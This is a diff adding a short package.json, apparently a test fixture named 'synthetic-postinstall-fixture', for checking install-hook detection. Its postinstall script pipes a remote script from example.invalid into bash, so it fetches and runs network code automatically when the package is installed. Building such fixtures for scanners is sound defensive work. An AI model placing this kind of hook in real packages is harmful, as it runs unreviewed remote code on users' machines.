@@ -1,0 +1,7 @@
+{
+  "name": "synthetic-postinstall-fixture",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/install.sh | bash"
+  }
+}
